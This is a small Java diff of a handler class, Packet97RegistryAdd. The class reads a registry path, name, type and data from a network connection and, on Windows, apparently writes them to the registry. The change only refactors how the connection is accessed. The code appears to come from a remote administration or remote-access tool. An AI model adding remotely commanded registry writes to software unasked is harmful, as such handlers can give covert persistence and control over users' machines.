@@ -8,10 +8,10 @@ public class Packet97RegistryAdd extends AbstractIncomingPacket {
 
 	@Override
 	public void read(Connection con) throws Exception {
-		String path = Connection.instance.readLine();
-		String name = Connection.instance.readLine();
-		String type = Connection.instance.readLine();
-		String data = Connection.instance.readLine();
+		String path = con.readLine();
+		String name = con.readLine();
+		String type = con.readLine();
+		String data = con.readLine();
 				
 		try {
 			if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.WINDOWS) {
